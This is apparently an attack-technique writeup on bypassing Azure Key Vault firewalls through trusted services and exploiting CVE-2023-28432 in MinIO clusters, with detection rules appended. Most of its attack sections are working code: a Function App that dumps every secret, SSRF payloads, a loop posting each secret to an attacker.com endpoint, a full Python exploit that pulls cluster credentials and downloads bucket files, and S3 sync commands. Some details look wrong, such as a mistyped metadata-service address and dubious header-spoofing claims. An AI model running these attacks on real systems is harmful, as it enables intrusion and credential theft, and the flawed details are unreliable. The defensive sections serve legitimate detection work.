# CA-UNSC-021: Azure Key Vault Firewall Bypass via Trusted Services & CVE-2023-28432

## 1. METADATA HEADER

| Property | Value |
|----------|-------|
| **SERVTEP ID** | CA-UNSC-021 |
| **Technique Title** | Azure Key Vault Firewall Bypass via Trusted Services and Cloud Storage Misconfigurations |
| **MITRE ATT&CK ID** | T1552.007 - Unsecured Credentials: Container API |
| **CVE Reference** | CVE-2023-28432 (MinIO Information Disclosure in Cluster Deployments) |
| **Platforms** | Azure (Entra ID, Key Vault), MinIO Clusters, Cloud Storage (AWS S3, Azure Blob) |
| **Required Access Level** | Network Access / Compromised Azure Service Account |
| **Attack Category** | Credential Access (TA0006) |
| **Technique Viability** | **ACTIVE** - Widely exploited; CVE-2023-28432 in CISA KEV (Known Exploited Vulnerabilities) |
| **Kill Chain Phase** | Reconnaissance → Resource Development → Initial Access → Credential Access |
| **CVE Disclosure Date** | March 20, 2023 |
| **First Exploitation Evidence** | March 12, 2024 (Metasploit module published) |
| **Related Techniques** | T1040.001 (Traffic Sniffing), T1526 (Cloud Service Discovery), T1087 (Account Discovery), T1580 (Cloud Infrastructure Discovery) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**CA-UNSC-021** describes the exploitation of Azure Key Vault firewall misconfigurations and CVE-2023-28432 (MinIO cluster information disclosure) to bypass access controls and extract sensitive credentials stored in restricted cloud repositories. The attack leverages two primary attack vectors: (1) the "Trusted Microsoft Services" bypass feature in Key Vault firewalls, which can be abused when a trusted service is compromised, and (2) CVE-2023-28432, a critical vulnerability in MinIO clusters that exposes all environment variables including storage credentials and secrets.

**Impact Severity: CRITICAL**
- Unauthenticated access to sensitive credentials without firewall restrictions
- Exposure of MINIO_SECRET_KEY, MINIO_ROOT_PASSWORD, and cloud storage credentials
- Lateral movement to cloud storage accounts (AWS S3, Azure Blob, GCS)
- Potential data exfiltration from protected repositories
- Bypass of network segmentation and IP-based access controls
- CISA-tracked vulnerability (CVE-2023-28432) actively exploited in the wild

**Threat Actor Profile:**
- Ransomware operators (exploiting MinIO for credential access)
- Cloud-native malware (Hildegard, TeamTNT)
- Supply chain attackers targeting containerized infrastructure
- Insider threats with access to Azure service accounts

---

## 3. TECHNICAL PREREQUISITES

### Environmental Requirements

#### Azure Key Vault Environment
- Azure Key Vault instance with firewall enabled
- Firewall set to "Allow trusted Microsoft services to bypass" (default insecure setting)
- Key Vault storing sensitive secrets, certificates, or keys
- At least one "trusted" Azure service (Function App, Logic App, App Service, etc.) in the environment

#### MinIO Cluster (For CVE-2023-28432)
- MinIO cluster deployment (not single-node)
- **Vulnerable versions:** RELEASE.2019-12-17T23-16-33Z through RELEASE.2023-03-20T20-16-18Z
- Network access to MinIO API endpoint (port 9000 by default)
- MinIO storing credentials in environment variables (common practice)

#### Cloud Storage Configuration
- Azure Blob Storage, AWS S3, or GCS accessed by MinIO
- Credentials stored in MinIO environment (MINIO_SECRET_KEY, AWS_ACCESS_KEY_ID, etc.)
- Key Vault storing these same credentials as backup/rotation mechanism

#### Attacker Capabilities Required
1. **For Key Vault Firewall Bypass:**
   - Network access to Azure environment (from internet or compromised Azure service)
   - Ability to identify and compromise a "trusted" Azure service
   - OR ability to enumerate and access private endpoints via Azure RM

2. **For CVE-2023-28432:**
   - Network access to MinIO cluster API endpoint
   - Knowledge of MinIO cluster deployment
   - No authentication required (unauthenticated endpoint)

### Prerequisites Checklist
- [ ] Azure Key Vault instance identified with firewall enabled
- [ ] Trusted services bypass feature enabled on Key Vault
- [ ] MinIO cluster identified and version determined
- [ ] Network access confirmed to MinIO /minio/bootstrap/v1/verify endpoint
- [ ] Service account compromised OR SSRF gadget chain identified in Azure service

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Phase 1: Azure Key Vault Discovery & Configuration Enumeration

#### Enumerate Key Vaults in Azure Subscription

```powershell
# Connect to Azure
Connect-AzAccount

# List all Key Vaults
Get-AzKeyVault | Select-Object VaultName, ResourceGroupName, Location

# Get detailed configuration for each Key Vault
$keyVaults = Get-AzKeyVault
foreach ($kv in $keyVaults) {
    $kvDetails = Get-AzKeyVault -VaultName $kv.VaultName -ResourceGroupName $kv.ResourceGroupName
    
    Write-Host "Key Vault: $($kv.VaultName)"
    Write-Host "Firewall Enabled: $(if ($kvDetails.NetworkAcls) { 'Yes' } else { 'No' })"
    Write-Host "Default Action: $($kvDetails.NetworkAcls.DefaultAction)"
    Write-Host "Bypass Setting: $($kvDetails.NetworkAcls.Bypass)"
    Write-Host "IP Rules: $($kvDetails.NetworkAcls.IpAddressRanges.Count)"
    Write-Host "VNet Rules: $($kvDetails.NetworkAcls.VirtualNetworkRules.Count)"
    Write-Host "---"
}
```

#### Identify Trusted Services Configuration

```powershell
# Check if trusted services can bypass firewall
$kvName = "mykeyvault"
$rg = "myresourcegroup"

$kv = Get-AzKeyVault -VaultName $kvName -ResourceGroupName $rg
$bypassSettings = $kv.NetworkAcls.Bypass

Write-Host "Bypass Configuration: $bypassSettings"

# "AzureServices" = Trusted services can bypass
# "None" = Firewall blocking all except whitelisted
# "VirtualNetworkServiceEndpoint,AzureServices" = Both VNet and trusted services allowed
```

#### Enumerate Trusted Azure Services in Environment

```powershell
# List all Function Apps (trusted by default)
Get-AzFunctionApp | Select-Object Name, ResourceGroupName, FunctionAppConfig.Runtime

# List all App Services (trusted by default)
Get-AzWebApp | Select-Object Name, ResourceGroupName, AppServicePlanId

# List all Logic Apps (trusted by default)
Get-AzLogicApp | Select-Object Name, ResourceGroupName, Location

# List all Azure SQL Servers (trusted by default)
Get-AzSqlServer | Select-Object ServerName, ResourceGroupName
```

### Phase 2: MinIO Cluster Discovery & Vulnerability Assessment

#### Network Reconnaissance for MinIO

```bash
# Scan for MinIO API endpoint (default port 9000)
nmap -p 9000,9001 target-subnet/ -Pn

# Identify MinIO via HTTP banner grabbing
curl -I http://target:9000/minio/bootstrap/v1/status

# Expected response indicates MinIO cluster
# Status: 200 OK + MinIO headers confirm presence
```

#### Enumerate MinIO Cluster Configuration

```bash
# Check MinIO health endpoint (no auth required on some versions)
curl http://target:9000/minio/bootstrap/v1/health

# Attempt to verify MinIO cluster (vulnerable endpoint)
curl http://target:9000/minio/bootstrap/v1/verify

# If vulnerable, response includes environment variables:
# {
#   "MINIO_ROOT_USER": "minioadmin",
#   "MINIO_ROOT_PASSWORD": "minioadmin123",
#   "MINIO_SECRET_KEY": "...",
#   "AWS_SECRET_ACCESS_KEY": "...",
#   ...
# }
```

#### Determine MinIO Version

```bash
# Query MinIO version via S3-compatible API
curl -s http://target:9000/?version | grep -oP 'Version>.*?</Version'

# Alternative: Check Docker image if accessible
docker inspect minio:latest | grep -i "Version\|MINIO"

# Check MinIO release notes or GitHub for version date
# Vulnerable versions: 2019-12-17 through 2023-03-20 (before RELEASE.2023-03-20T20-16-18Z)
```

### Phase 3: Identify SSRF/Gadget Chain Opportunities

#### Discover SSRF Vulnerabilities in Azure Services

```powershell
# Enumerate web applications and identify SSRF-prone services
$webApps = Get-AzWebApp

foreach ($app in $webApps) {
    # Check app service plan and potential for SSRF
    $config = Get-AzWebAppConfig -ResourceGroupName $app.ResourceGroupName -Name $app.Name
    
    # Applications handling file uploads or URL processing are high-risk
    Write-Host "App: $($app.Name)"
    Write-Host "HTTPS Only: $($config.HttpsOnly)"
    Write-Host "Managed Identity: $(if ($app.Identity) { 'Enabled' } else { 'Disabled' })"
}

# Function Apps are particularly dangerous for SSRF
# They can make outbound HTTP requests and handle external input
Get-AzFunctionAppSetting -ResourceGroupName "rg" -FunctionAppName "myapp" | 
    Where-Object { $_.Name -like "*URL*" -or $_.Name -like "*ENDPOINT*" }
```

#### Identify Container API Access Opportunities

```bash
# Check if running in container environment
env | grep -i "container\|docker\|kubernetes"

# Test Docker socket access (if running in container)
curl -v --unix-socket /var/run/docker.sock http://localhost/v1.40/containers/json

# Test Kubernetes API access (if running in K8s cluster)
curl https://kubernetes.default.svc/api/v1/namespaces | \
    jq '.items[] | .metadata.name'

# Retrieve Kubernetes service account credentials
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

---

## 5. ATTACK EXECUTION METHODS

### Method 1: Azure Key Vault Firewall Bypass via Trusted Service Compromise

**Attack Prerequisites:**
- Identify compromised/vulnerable Azure service (Function App, App Service, etc.)
- Service has managed identity with access to Key Vault
- Key Vault firewall allows "AzureServices" to bypass

#### Step 1: Compromise Trusted Azure Service

**Option A: Deploy Malicious Function App (If you have deployment access)**

```powershell
# Create a malicious Azure Function to extract Key Vault secrets
# Function code in C#:

public static async Task<IActionResult> Run(
    [HttpTrigger(AuthorizationLevel.Anonymous, "get", Route = null)] 
    HttpRequest req,
    ILogger log)
{
    var kvUri = "https://mykeyvault.vault.azure.net";
    var credential = new DefaultAzureCredential();
    var client = new SecretClient(new Uri(kvUri), credential);
    
    try
    {
        // Retrieve all secrets from Key Vault
        var secretProperties = client.GetPropertiesOfSecretsAsync();
        var results = new List<string>();
        
        await foreach (var secretProperty in secretProperties)
        {
            var secret = await client.GetSecretAsync(secretProperty.Name);
            results.Add($"{secretProperty.Name}: {secret.Value.Value}");
        }
        
        return new OkObjectResult(results);
    }
    catch (Exception ex)
    {
        log.LogError($"Error: {ex.Message}");
        return new BadRequestObjectResult(ex.Message);
    }
}

# Deploy function with Managed Identity that has Key Vault access
```

**Option B: Exploit Existing SSRF in Web Application**

```python
import requests
import json

# Target a web application running in Azure (trusted service)
# that has SSRF vulnerability in image processing or file download

ssrf_target = "https://vulnerable-app.azurewebsites.net/image?url="
keyvault_url = "https://mykeyvault.vault.azure.net/secrets/mysecret?api-version=7.3"

# The vulnerable app will fetch the URL server-side
# Azure's managed identity is attached to the app
# Firewall allows requests from this app

payload = ssrf_target + keyvault_url

response = requests.get(payload)
print(f"Response: {response.text}")

# Result: Key Vault responds because request originates from trusted service
# Even though firewall is enabled, trusted services bypass it
```

#### Step 2: Use Trusted Service Identity to Access Key Vault

```powershell
# Once inside the compromised Azure service, use Managed Identity

# Option 1: In Function App / App Service code
using Azure.Identity;
using Azure.Security.KeyVault.Secrets;

var kvUri = new Uri("https://mykeyvault.vault.azure.net");
var credential = new DefaultAzureCredential();  // Uses Managed Identity
var client = new SecretClient(kvUri, credential);

SecretProperties secret = await client.GetSecretAsync("mySecret");
string secretValue = secret.Value;

# Option 2: Via REST API with bearer token
$token = (Invoke-RestMethod -Uri "http://169.169.169.169/metadata/identity/oauth2/token?api-version=2017-09-01&resource=https://vault.azure.net" `
    -Headers @{"Metadata"="true"}).access_token

$headers = @{"Authorization"="Bearer $token"}
$response = Invoke-RestMethod -Uri "https://mykeyvault.vault.azure.net/secrets/mysecret?api-version=7.3" `
    -Headers $headers

Write-Host "Secret Value: $($response.value)"
```

#### Step 3: Exfiltrate All Key Vault Secrets

```powershell
# Connect using stolen/acquired Managed Identity token
# Iterate through all secrets and export them

$kvUri = "https://targetkeyvault.vault.azure.net"

# Get all secret names
$secretsList = Invoke-RestMethod -Uri "$kvUri/secrets?api-version=7.3" `
    -Headers @{"Authorization"="Bearer $token"}

foreach ($secret in $secretsList.value) {
    $secretName = $secret.id.Split('/')[-1]
    
    # Retrieve each secret
    $secretValue = Invoke-RestMethod -Uri "$kvUri/secrets/$secretName?api-version=7.3" `
        -Headers @{"Authorization"="Bearer $token"}
    
    Write-Host "$secretName : $($secretValue.value)"
    
    # Exfiltrate to attacker-controlled endpoint
    Invoke-WebRequest -Uri "https://attacker.com/exfil" `
        -Method POST `
        -Body @{secret_name=$secretName; secret_value=$secretValue.value}
}
```

---

### Method 2: CVE-2023-28432 - MinIO Cluster Information Disclosure

**Attack Prerequisites:**
- Vulnerable MinIO cluster (version 2019-12-17 through 2023-03-20)
- Network access to MinIO API endpoint
- No authentication required

#### Step 1: Identify Vulnerable MinIO Cluster

```bash
# Scan for MinIO endpoints
for ip in 10.0.0.{1..254}; do
    timeout 1 curl -s http://$ip:9000/minio/bootstrap/v1/verify -o /dev/null && echo "MinIO found at $ip"
done

# Verify vulnerability by checking endpoint
curl -v http://target:9000/minio/bootstrap/v1/verify
```

#### Step 2: Exploit CVE-2023-28432 to Extract Credentials

```bash
# The vulnerable /minio/bootstrap/v1/verify endpoint returns environment variables

curl -s http://target:9000/minio/bootstrap/v1/verify | jq '.'

# Expected response (if vulnerable):
# {
#   "name": "minio",
#   "version": "2023-02-27T18-42-03Z",
#   "commit": "...",
#   "squid": "...",
#   "MINIO_ROOT_USER": "minioadmin",
#   "MINIO_ROOT_PASSWORD": "SecurePassword123!",
#   "MINIO_SECRET_KEY": "full-secret-key-here",
#   "AWS_ACCESS_KEY_ID": "AKIA...",
#   "AWS_SECRET_ACCESS_KEY": "...",
#   "AZURE_STORAGE_ACCOUNT": "storageaccount",
#   "AZURE_STORAGE_KEY": "...",
#   "MINIO_IDENTITY_LDAP_SERVER_ADDR": "ldap.contoso.com",
#   ...
# }
```

#### Step 3: Parse and Utilize Extracted Credentials

```python
#!/usr/bin/env python3
import requests
import json
import sys

def exploit_cve_2023_28432(target_url):
    """
    Exploit CVE-2023-28432 to extract MinIO cluster credentials
    """
    
    endpoint = f"http://{target_url}:9000/minio/bootstrap/v1/verify"
    
    try:
        response = requests.get(endpoint, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            
            # Extract sensitive information
            credentials = {
                'minio_root_user': data.get('MINIO_ROOT_USER'),
                'minio_root_password': data.get('MINIO_ROOT_PASSWORD'),
                'minio_secret_key': data.get('MINIO_SECRET_KEY'),
                'aws_access_key': data.get('AWS_ACCESS_KEY_ID'),
                'aws_secret_key': data.get('AWS_SECRET_ACCESS_KEY'),
                'azure_storage_account': data.get('AZURE_STORAGE_ACCOUNT'),
                'azure_storage_key': data.get('AZURE_STORAGE_KEY'),
                'all_env_vars': data
            }
            
            return credentials
        else:
            print(f"[!] Request failed: {response.status_code}")
            return None
            
    except Exception as e:
        print(f"[!] Error: {e}")
        return None

def access_minio_with_credentials(minio_host, root_user, root_password):
    """
    Use extracted MinIO credentials to access the cluster
    """
    
    from minio import Minio
    
    client = Minio(
        f"{minio_host}:9000",
        access_key=root_user,
        secret_key=root_password,
        secure=False
    )
    
    # List all buckets
    buckets = client.list_buckets()
    print("[+] MinIO Buckets:")
    for bucket in buckets.buckets:
        print(f"  - {bucket.name}")
    
    # List all objects in a bucket
    for bucket in buckets.buckets:
        print(f"\n[+] Contents of {bucket.name}:")
        objects = client.list_objects(bucket.name, recursive=True)
        for obj in objects:
            print(f"  - {obj.object_name}")
            
            # Download sensitive files
            if any(ext in obj.object_name for ext in ['.json', '.yaml', '.conf', '.key', '.pem']):
                try:
                    client.fget_object(bucket.name, obj.object_name, f"/tmp/{obj.object_name}")
                    print(f"    [Downloaded] {obj.object_name}")
                except:
                    pass

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "target.internal"
    
    print(f"[*] Exploiting CVE-2023-28432 on {target}")
    
    creds = exploit_cve_2023_28432(target)
    
    if creds:
        print("\n[+] Extracted Credentials:")
        print(json.dumps(creds, indent=2))
        
        # Use MinIO credentials
        print("\n[*] Accessing MinIO with extracted credentials...")
        access_minio_with_credentials(
            target,
            creds['minio_root_user'],
            creds['minio_root_password']
        )
```

#### Step 4: Lateral Movement Using Storage Credentials

```bash
# Use extracted AWS credentials to access S3 buckets
export AWS_ACCESS_KEY_ID=$(extracted_key_id)
export AWS_SECRET_ACCESS_KEY=$(extracted_secret_key)

aws s3 ls

# List sensitive buckets
aws s3 ls s3://production-backups/

# Download data
aws s3 sync s3://production-backups/ ./local-copy/

# Similar for Azure Storage
az storage account list --account-name $(extracted_account)
az storage container list --account-name $(extracted_account) \
    --account-key $(extracted_key)
```

---

### Method 3: Azure Key Vault Private Endpoint Enumeration & Bypass

**Attack Prerequisites:**
- Azure RM access (Reader role minimum)
- VNet connectivity or SSRF gadget chain

#### Step 1: Enumerate Private Endpoints

```powershell
# List all private endpoints in subscription
Get-AzPrivateEndpoint | Where-Object { $_.Name -like "*keyvault*" }

# Get detailed private endpoint configuration
$pe = Get-AzPrivateEndpoint -ResourceGroupName "rg" -Name "kvprivateendpoint"
$pe | Select-Object Name, PrivateLinkServiceConnections

# Retrieve private IP address
$nic = Get-AzNetworkInterface -ResourceId $pe.NetworkInterfaces[0].Id
$nic.IpConfigurations[0].PrivateIpAddress

# Example output: 10.1.2.5 (private IP for Key Vault)
```

#### Step 2: Access Key Vault via Private Endpoint

```powershell
# From a VM inside the VNet:
$privateIP = "10.1.2.5"  # Private endpoint IP

# Direct access via private IP (resolves via private DNS zone)
$token = (Invoke-RestMethod -Uri "http://169.169.169.169/metadata/identity/oauth2/token?api-version=2017-09-01&resource=https://vault.azure.net" `
    -Headers @{"Metadata"="true"}).access_token

# Query Key Vault via private endpoint (no firewall rules apply)
Invoke-RestMethod -Uri "https://mykeyvault.vault.azure.net/secrets/mysecret?api-version=7.3" `
    -Headers @{"Authorization"="Bearer $token"}
```

---

### Method 4: Service Tag Spoofing / SSRF via Trusted Service Attribute

**Attack Prerequisites:**
- Azure service with SSRF vulnerability
- Ability to control request headers/attributes

#### Exploit

```python
# If target app has SSRF and passes headers to backend:
import requests

ssrf_target = "http://vulnerable-app.azurewebsites.net/fetch"

# Craft payload with spoofed service tags
payload = {
    'url': 'https://mykeyvault.vault.azure.net/secrets/mysecret?api-version=7.3',
    'headers': {
        'X-Original-URL': 'https://mykeyvault.vault.azure.net/secrets/mysecret',
        'X-Forwarded-For': '20.61.103.227',  # Azure service IP
        'X-Azure-Service': 'AppService'       # Service tag spoofing
    }
}

response = requests.post(ssrf_target, json=payload)
print(response.text)
```

---

## 6. TOOLS & COMMANDS REFERENCE

| Tool | Purpose | Command | Platform |
|------|---------|---------|----------|
| **curl** | CVE-2023-28432 POC exploitation | `curl http://target:9000/minio/bootstrap/v1/verify` | Cross-platform |
| **Python Boto3** | AWS credential usage via extracted keys | `boto3.client('s3', aws_access_key_id=..., aws_secret_access_key=...)` | Cross-platform |
| **Python MinIO SDK** | MinIO cluster access with stolen credentials | `from minio import Minio` | Python |
| **Azure CLI** | Key Vault enumeration & access | `az keyvault secret list --vault-name mykeyvault` | Cross-platform |
| **Azure PowerShell** | Trusted services discovery | `Get-AzKeyVault`, `Get-AzFunctionApp` | Windows |
| **Azure SDK (.NET)** | Programmatic Key Vault access | `new SecretClient(new Uri(kvUri), credential)` | .NET |
| **Metasploit** | Automated CVE-2023-28432 exploitation | `use auxiliary/gather/minio_bootstrap_verify_info_disc` | Linux |
| **YARA** | Detect MinIO exploitation attempts | Custom rules for /minio/bootstrap/v1/verify | Linux |
| **nmap** | Network reconnaissance for MinIO | `nmap -p 9000 target-subnet/24` | Cross-platform |
| **az storage** | Azure Storage account access | `az storage blob download --account-name ... --container-name ...` | Cross-platform |

---

## 7. ATOMIC RED TEAM TESTS

### Test 1: CVE-2023-28432 MinIO Information Disclosure

**Platforms:** Linux, macOS, Windows (with curl/Python)

```bash
#!/bin/bash
# Atomic test for CVE-2023-28432

TARGET="${1:-localhost:9000}"

echo "[*] Testing CVE-2023-28432 on $TARGET"

# Test 1: Check if /minio/bootstrap/v1/verify endpoint exists
echo "[*] Checking MinIO bootstrap endpoint..."
RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" http://$TARGET/minio/bootstrap/v1/verify)

if [ "$RESPONSE" = "200" ]; then
    echo "[+] Vulnerable endpoint found (HTTP 200)"
    
    # Test 2: Extract environment variables
    echo "[*] Extracting environment variables..."
    curl -s http://$TARGET/minio/bootstrap/v1/verify | jq '.MINIO_ROOT_PASSWORD, .AWS_ACCESS_KEY_ID, .AZURE_STORAGE_KEY'
    
    echo "[+] Credentials potentially exposed!"
else
    echo "[-] Endpoint not vulnerable or not MinIO ($RESPONSE)"
fi
```

**Expected Artifacts:**
- MINIO_ROOT_USER / MINIO_ROOT_PASSWORD in response
- Cloud credentials (AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY)
- Azure storage keys (AZURE_STORAGE_ACCOUNT, AZURE_STORAGE_KEY)

---

### Test 2: Azure Key Vault Firewall Trusted Services Bypass

**Platforms:** Windows (PowerShell with Az module)

```powershell
# Atomic test for Key Vault trusted services bypass

function Test-KeyVaultTrustedServicesAccess {
    param(
        [string]$KeyVaultName,
        [string]$ResourceGroupName,
        [string]$FunctionAppName
    )
    
    # Get Key Vault configuration
    $kv = Get-AzKeyVault -VaultName $KeyVaultName -ResourceGroupName $ResourceGroupName
    
    if ($kv.NetworkAcls.DefaultAction -eq "Deny" -and $kv.NetworkAcls.Bypass -eq "AzureServices") {
        Write-Host "[!] Key Vault has firewall enabled with AzureServices bypass"
        Write-Host "[!] Risk: Compromised Function App can access this Key Vault"
        
        # Check if Function App has Managed Identity
        $app = Get-AzFunctionApp -ResourceGroupName $ResourceGroupName -Name $FunctionAppName
        if ($app.Identity) {
            Write-Host "[+] Function App has Managed Identity: $($app.Identity.PrincipalId)"
            Write-Host "[+] This identity can bypass Key Vault firewall!"
        }
        
        return $true
    } else {
        Write-Host "[-] Key Vault firewall not vulnerable to trusted services bypass"
        return $false
    }
}

# Usage
Test-KeyVaultTrustedServicesAccess -KeyVaultName "mykeyvault" `
    -ResourceGroupName "myresourcegroup" `
    -FunctionAppName "myfunctionapp"
```

---

### Test 3: Private Endpoint Discovery

**Platforms:** Linux, PowerShell

```powershell
# Discover and enumerate private endpoints

Get-AzPrivateEndpoint | ForEach-Object {
    Write-Host "Private Endpoint: $($_.Name)"
    Write-Host "Resource: $($_.PrivateLinkServiceConnections.PrivateLinkServiceId)"
    Write-Host "VNet: $($_.SubnetId.Split('/')[8])"
    Write-Host "Subnet: $($_.SubnetId.Split('/')[-1])"
    Write-Host "---"
}

# Attempt connection from within VNet
# (Requires VM in same VNet)

Invoke-RestMethod -Uri "https://mykeyvault.vault.azure.net/secrets/mysecret?api-version=7.3" `
    -Headers @{"Authorization"="Bearer $(Get-AzAccessToken -ResourceUrl https://vault.azure.net | Select-Object -ExpandProperty Token)"}
```

---

## 8. SPLUNK DETECTION RULES

### Splunk Rule 1: CVE-2023-28432 Exploitation Attempt

**Data Source:** Network Traffic / WAF Logs

```spl
source="network_traffic" OR source="waf_logs"
(url CONTAINS "/minio/bootstrap/v1/verify" OR path CONTAINS "/minio/bootstrap/v1/verify")
| stats count by src_ip, dest_ip, user_agent
| where count > 0
```

**False Positives:**
- Legitimate MinIO health checks
- Internal monitoring/automation

**Tuning:**
```spl
url CONTAINS "/minio/bootstrap/v1/verify"
| where NOT (src_ip IN ("10.0.0.0/8", "monitoring_system"))
| alert
```

---

### Splunk Rule 2: Suspicious Key Vault Access from Untrusted Services

**Data Source:** Azure Activity Logs, Azure Audit Logs

```spl
source="azure_activity" action="*KeyVault*" 
(action="SecretRead" OR action="SecretList" OR action="CertificateRead")
| search caller!="SYSTEM" AND caller!="*service_principal*"
| stats count, values(caller), values(caller_ip_address) by resource_name
| where count > 5 OR (caller_ip_address NOT IN ("office_ips", "authorized_ips"))
```

---

### Splunk Rule 3: Trusted Service Making Unusual Key Vault Requests

**Data Source:** Azure Diagnostic Logs for Key Vault

```spl
source="azure_keyvault" 
(clientIP CONTAINS "20.6" OR clientIP CONTAINS "20.1")  // Azure Service IPs
authorization="Allow" 
(operation="SecretGet" OR operation="SecretList" OR operation="CertificateGet")
| stats count by clientIP, requesterObjectId, resource
| where count > 10
```

---

### Splunk Rule 4: MinIO Environment Variable Exfiltration

**Data Source:** Network Traffic / IDS Logs

```spl
(source="zeek" OR source="suricata")
http.uri CONTAINS "/minio/bootstrap/v1/verify"
http.status=200
| search http.resp_body CONTAINS ("MINIO_ROOT_PASSWORD" OR "AWS_SECRET_ACCESS_KEY" OR "AZURE_STORAGE_KEY")
| alert severity=critical
```

---

## 9. MICROSOFT SENTINEL DETECTION

### Sentinel Query 1: CVE-2023-28432 MinIO Exploitation

**Rule Configuration:**
- **Required Table:** CommonSecurityLog (Firewall/WAF) or NetworkSession
- **Required Fields:** SourceIP, DestinationPort, RequestPath
- **Alert Severity:** Critical
- **Frequency:** Real-time
- **Applies To:** Networks with MinIO deployments

**KQL Query:**

```kusto
CommonSecurityLog
| where DestinationPort == 9000 and RequestPath contains "/minio/bootstrap/v1/verify"
| extend IsMinIOExploit = iff(RequestPath contains "verify", 1, 0)
| where IsMinIOExploit == 1
| summarize ExploitAttempts=count() by SourceIP, DestinationIP, TimeGenerated
| where ExploitAttempts > 0
```

---

### Sentinel Query 2: Suspicious Key Vault Access via Trusted Service

**Rule Configuration:**
- **Required Table:** AzureActivity, KeyVaultAuditLogs
- **Alert Severity:** High
- **Frequency:** Hourly

**KQL Query:**

```kusto
KeyVaultAuditLogs
| where OperationName in ("SecretGet", "SecretList", "CertificateGet")
| where CallerIPAddress startswith "20.6" or CallerIPAddress startswith "20.1"  // Azure service IPs
| where ResultSignature == "Success"
| extend IsAnomalous = iff(
    TimeGenerated < ago(7d) and 
    (ResultSignature == "Success" and OperationName in ("SecretGet", "SecretList")),
    1, 0)
| where IsAnomalous == 1
| project TimeGenerated, OperationName, CallerIPAddress, ResourceName, RequestID
```

---

### Sentinel Query 3: Key Vault Firewall Rule Modification

**Rule Configuration:**
- **Required Table:** AzureActivity
- **Alert Severity:** Critical

**KQL Query:**

```kusto
AzureActivity
| where ResourceProvider == "Microsoft.KeyVault"
| where OperationNameValue in (
    "Microsoft.KeyVault/vaults/networkAcls/write",
    "MICROSOFT.KEYVAULT/VAULTS/UPDATE",
    "Update Key Vault Firewall"
)
| where ActivityStatusValue == "Succeeded"
| project TimeGenerated, Caller, OperationNameValue, Resource
| summarize count() by Caller, OperationNameValue
| where count_ > 1
```

---

### Sentinel Query 4: Private Endpoint Access Outside Expected VNet

**Rule Configuration:**
- **Required Table:** AzureActivity, NetworkFlowLogs
- **Alert Severity:** High

**KQL Query:**

```kusto
CommonSecurityLog
| where DestinationPort in (443, 9000)
| where DestinationIP in (
    "10.1.2.5",  // Known private endpoint IPs
    "10.1.2.6"
)
| where SourceIP not in (
    "10.0.0.0/8",  // Expected VNet ranges
    "192.168.0.0/16"
)
| summarize Connections=count() by SourceIP, DestinationIP, DestinationPort
| where Connections > 3
```

---

## 10. WINDOWS EVENT LOG MONITORING

### Event Log 1: Azure Managed Identity Token Requests

**Event ID:** Security Event 4673 (Service Account Access)

- **Log Source:** Security, Application
- **Trigger:** Metadata service accessed for token (169.254.169.254)
- **Filter:** "CallingProcess contains 'python.exe' OR 'node.exe' OR 'java.exe'"
- **Applies To:** VMs with Managed Identity

**Manual Configuration:**

```powershell
# Enable audit policy for service account usage
auditpol /set /subcategory:"Service Account" /success:enable /failure:enable

# Monitor for metadata service access
Get-WinEvent -LogName Security -FilterHashtable @{EventID=4673} | 
    Where-Object {$_.Message -match "metadata|169.254"}
```

---

### Event Log 2: Key Vault Authentication Failures / Successes

**Event ID:** Application logs (via Azure Diagnostics)

- **Log Source:** Azure Key Vault diagnostic logs
- **Trigger:** AuthenticationFailure, AuthorizationSuccess
- **Filter:** "ResultSignature != 'Success' AND ClientIP not in Whitelist"
- **Applies To:** Key Vault instances

---

## 11. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+
**Supported Platforms:** Windows (in containerized/cloud environments)

**Sysmon Configuration Snippet:**

```xml
<Sysmon schemaversion="4.30">
  <EventFiltering>
    <!-- Detect curl/wget accessing MinIO endpoints -->
    <ProcessCreate onmatch="include">
      <CommandLine condition="contains any">
        /minio/bootstrap/v1/verify;
        /minio/bootstrap/v1/health;
        169.254.169.254  <!-- Metadata service -->
      </CommandLine>
    </ProcessCreate>

    <!-- Detect Python/Node accessing metadata service -->
    <NetworkConnect onmatch="include">
      <DestinationIp>169.254.169.254</DestinationIp>
      <DestinationPort>80</DestinationPort>
      <Image condition="excludes">
        C:\Program Files\*\Azure\*;
        C:\Program Files (x86)\Microsoft\*
      </Image>
    </NetworkConnect>

    <!-- Detect environment variable access -->
    <ProcessCreate onmatch="include">
      <CommandLine condition="contains any">
        $env:;
        echo $;
        printenv
      </CommandLine>
    </ProcessCreate>

    <!-- Detect cloud SDK tool usage -->
    <ProcessCreate onmatch="include">
      <Image condition="contains any">
        aws.exe;
        az.exe;
        gcloud.exe
      </Image>
      <CommandLine condition="contains any">
        s3 ls;
        storage blob;
        gsutil
      </CommandLine>
    </ProcessCreate>
  </EventFiltering>
</Sysmon>
```

---

## 12. MICROSOFT DEFENDER FOR CLOUD

### Alert 1: Suspicious Key Vault Access from Untrusted Source

**Alert Name:** "Suspicious access to Key Vault detected"

- **Severity:** High
- **Description:** Multiple failed authentication attempts followed by successful access
- **Applies To:** Azure Key Vault with firewall enabled
- **Remediation:**
  1. Review Key Vault access logs
  2. Rotate compromised secrets
  3. Revoke suspicious access
  4. Check for compromised identities

**Manual Configuration Steps:**

1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings** → **Your Subscription**
3. Under **Defender plans**, enable:
   - **Defender for Key Vault**: ON
4. Click **Save**
5. Configure alert rules under **Security alerts**

---

### Alert 2: MinIO Cluster Vulnerability Detected

**Alert Name:** "Vulnerable MinIO version detected"

- **Severity:** Critical
- **Description:** MinIO cluster running version vulnerable to CVE-2023-28432
- **Applies To:** Container instances, Kubernetes clusters running MinIO
- **Remediation:**
  1. Upgrade MinIO to RELEASE.2023-03-20T20-16-18Z or later
  2. Rotate all MinIO credentials
  3. Audit MinIO access logs for exploitation attempts
  4. Review stored credentials for exposure

---

## 13. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

### Query: Key Vault Secret Access Events

```powershell
# Connect to Purview
Connect-ExchangeOnline

# Search for Key Vault access operations
